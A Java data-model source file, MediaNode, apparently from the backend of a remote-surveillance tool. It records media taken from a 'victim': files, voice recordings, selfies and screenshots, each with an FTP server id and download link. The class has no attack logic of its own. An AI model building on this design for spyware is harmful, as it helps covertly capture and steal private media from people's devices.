package com.theah64.xrob.api.models;

/**
 * Created by theapache64 on 9/10/16.
 */
public class MediaNode {


    private static final String MEDIA_TYPE_FILE = "FILE";
    private static final String MEDIA_TYPE_VOICE = "VOICE";
    private static final String MEDIA_TYPE_SELFIE = "SELFIE";
    private static final String MEDIA_TYPE_SCREENSHOT = "SCREENSHOT";


    private final String victimId, name, type, ftpServerId, downloadLink;
    private final long fileSizeInKb, capturedAt;

    public MediaNode(String victimId, String name, String type, String ftpServerId, String downloadLink, long fileSizeInKb, long capturedAt) {
        this.victimId = victimId;
        this.name = name;
        this.type = type;
        this.ftpServerId = ftpServerId;
        this.downloadLink = downloadLink;
        this.fileSizeInKb = fileSizeInKb;
        this.capturedAt = capturedAt;
    }

    public String getVictimId() {
        return victimId;
    }

    public String getName() {
        return name;
    }

    public String getType() {
        return type;
    }

    public String getFtpServerId() {
        return ftpServerId;
    }

    public String getDownloadLink() {
        return downloadLink;
    }

    public long getFileSizeInKb() {
        return fileSizeInKb;
    }

    public long getCapturedAt() {
        return capturedAt;
    }

    public static boolean isValidType(String type) {
        switch (type) {
            case MEDIA_TYPE_FILE:
            case MEDIA_TYPE_VOICE:
            case MEDIA_TYPE_SELFIE:
            case MEDIA_TYPE_SCREENSHOT:
                return true;
            default:
                return false;
        }
    }
}